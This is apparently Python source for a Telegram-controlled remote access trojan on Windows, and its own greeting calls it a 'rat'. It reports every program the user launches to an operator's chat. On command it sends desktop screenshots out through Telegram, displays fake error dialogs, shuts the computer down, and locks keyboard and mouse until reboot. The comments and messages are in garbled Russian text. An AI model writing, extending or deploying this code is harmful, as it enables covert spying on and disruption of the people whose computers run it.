import ctypes
import telebot
import time
import atexit
import threading
import pythoncom
import wmi
import pyautogui
import os
import pygetwindow as gw
import config
from io import BytesIO
from config import TOKEN, AUTHORIZED_ID, IGNORED_PROCESSES
from datetime import datetime
from telebot import types

IGNORED_PROCESSES = config.IGNORED_PROCESSES
TOKEN = config.TOKEN
AUTHORIZED_CHAT_ID = config.AUTHORIZED_ID
mouse_blocked = False  # –§–ª–∞–≥, —É–∫–∞–∑—ã–≤–∞—é—â–∏–π, –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∞ –ª–∏ –º—ã—à—å
bot = telebot.TeleBot(TOKEN)

RESTART_THRESHOLD = 1  # –ü–æ—Ä–æ–≥ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–∞, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
restart_count = {}

def send_startup_message():
    start_time = datetime.now().strftime("%H:%M:%S")
    bot.send_message(AUTHORIZED_CHAT_ID, f"üíª –ö–æ–º–ø—å—é—Ç–µ—Ä –≤–∫–ª—é—á–µ–Ω.\n‚öôÔ∏è –í—Ä–µ–º—è –≤–∫–ª—é—á–µ–Ω–∏—è: {start_time}", reply_markup=create_keyboard())

def exit_handler():
    shutdown_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.send_message(AUTHORIZED_CHAT_ID, f"üíª –ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–µ–Ω.\n‚öôÔ∏è –í—Ä–µ–º—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è: {shutdown_time}")

def process_events():
    try:
        pythoncom.CoInitialize()
        c = wmi.WMI()
        wmi_event = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = wmi_event()
                pythoncom.PumpWaitingMessages()
                if new_process.Caption and new_process.Caption not in IGNORED_PROCESSES:
                    time.sleep(1)
                    log_application_start(new_process.Caption)
            except wmi.x_wmi_timed_out:
                pass
            time.sleep(1)
    except Exception as e:
        print(f"Exception in process_events: {e}")
    finally:
        pythoncom.CoUninitialize()

def log_application_start(application_name):
    current_time = datetime.now()
    bot.send_message(AUTHORIZED_CHAT_ID, f"üöÄ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—É—Å—Ç–∏–ª –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ: {application_name}\n‚öôÔ∏è –í—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")

def take_screenshot():
    screenshot = pyautogui.screenshot()
    img_byte_array = BytesIO()
    screenshot.save(img_byte_array, format='PNG')
    img_byte_array.seek(0)
    return img_byte_array

def is_authorized(chat_id):
    return str(chat_id) == AUTHORIZED_CHAT_ID

def create_keyboard():
    keyboard = types.ReplyKeyboardMarkup(row_width=2)
    shutdown_button = types.KeyboardButton('üí§ –í—ã–∫–ª—é—á–µ–Ω–∏–µ')
    screenshot_button = types.KeyboardButton('üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç')
    offdevices_button = types.KeyboardButton('‚ùå –í—ã–∫–ª—é—á–∏—Ç—å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –∏ –º—ã—à—å (–¥–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏)')
    keyboard.add(shutdown_button, screenshot_button, offdevices_button)
    return keyboard

@bot.message_handler(commands=['cid'])
def handle_cid(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, f"üíÇ‚Äç‚ôÇÔ∏è –í–∞—à chat_id: {message.chat.id}", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "üö∑ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.")

@bot.message_handler(commands=['error'])
def handle_error(message):
    if is_authorized(message.chat.id):
        try:
            _, error_message = message.text.split(maxsplit=1)
            ctypes.windll.user32.MessageBoxW(0, error_message, "Error", 1 | 48)
            bring_window_to_front("Error")
            bot.send_message(message.chat.id, "‚úÖ –§–µ–π–∫–æ–≤–∞—è –æ—à–∏–±–∫–∞ –≤—ã–∑–≤–∞–Ω–∞ —É—Å–ø–µ—à–Ω–æ!", reply_markup=create_keyboard())
        except ValueError:
            bot.send_message(message.chat.id, "‚ùå –£–∫–∞–∂–∏—Ç–µ —Ç–µ–∫—Å—Ç –æ—à–∏–±–∫–∏ –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã /error.", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "üö∑ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.", reply_markup=create_keyboard())

def bring_window_to_front(window_title):
    try:
        window = gw.getWindowsWithTitle(window_title)[0]
        window.activate()
    except IndexError:
        pass

@bot.message_handler(commands=['start'])
def handle_start(message):
    if is_authorized(message.chat.id):
        welcome_message = (
            "–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç-—Ä–∞—Ç–æ—á–∫–∞ üêÄ. –í–æ—Ç –º–æ–∏ –∫–æ–º–∞–Ω–¥—ã:\n\n"
            "üìå /start - –≤—ã–≤–æ–¥–∏—Ç –¥–∞–Ω–Ω—ã–π —Ç–µ–∫—Å—Ç\n"
            "‚ùå /error {—Ç–µ–∫—Å—Ç} - –≤—ã–≤–æ–¥–∏—Ç —Ñ–µ–π–∫–æ–≤—É—é –æ—à–∏–±–∫—É\n"
            "üñºÔ∏è /screenshot - –¥–µ–ª–∞–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞\n"
            "üí§ /off - –≤—ã–∫–ª—é—á–∞–µ—Ç –ø–∫\n"
            "üö∑ /off_devices - –≤—ã–∫–ª—é—á–∞–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –∏ –º—ã—à—å –¥–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏ –ø–∫"
        )
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "üö∑ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.", reply_markup=create_keyboard())

@bot.message_handler(func=lambda message: message.text.lower() in ['/screenshot', 'üì∏ —Å–∫—Ä–∏–Ω—à–æ—Ç'])
def handle_screen(message):
    if is_authorized(message.chat.id):
        try:
            screenshot = take_screenshot()
            bot.send_photo(message.chat.id, screenshot, caption="ü§ñ –°–∫—Ä–∏–Ω—à–æ—Ç —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞:", reply_markup=create_keyboard())
        except Exception as e:
            print(f"Exception in handle_screen: {e}")
    else:
        bot.send_message(message.chat.id, "üö∑ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.")

@bot.message_handler(func=lambda message: message.text.lower() in ['/off', 'üí§ –≤—ã–∫–ª—é—á–µ–Ω–∏–µ'])
def handle_off(message):
    if is_authorized(message.chat.id):
        bot.send_message(message.chat.id, "üí§ –í—ã–∫–ª—é—á–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞...", reply_markup=create_keyboard())
        time.sleep(2)
        os.system('shutdown /s /t 1')
    else:
        bot.send_message(message.chat.id, "üö∑ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.", reply_markup=create_keyboard())

@bot.message_handler(func=lambda message: message.text.lower() in ['/off_devices', '‚ùå –≤—ã–∫–ª—é—á–∏—Ç—å –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –∏ –º—ã—à—å (–¥–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏)'])
def handle_block_devices(message):
    if is_authorized(message.chat.id):
        ctypes.windll.user32.BlockInput(True)
        bot.send_message(message.chat.id, "üí§ –í–≤–æ–¥ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω (–º—ã—à—å –∏ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞). –î–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫—É –∫–æ–º–ø—å—é—Ç–µ—Ä–∞.", reply_markup=create_keyboard())
    else:
        bot.send_message(message.chat.id, "üö∑ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.", reply_markup=create_keyboard())


if __name__ == "__main__":
    send_startup_message_thread = threading.Thread(target=send_startup_message, daemon=True)
    send_startup_message_thread.start()

    process_events_thread = threading.Thread(target=process_events, daemon=True)
    process_events_thread.start()

    bot.polling(none_stop=True)
    atexit.register(exit_handler)
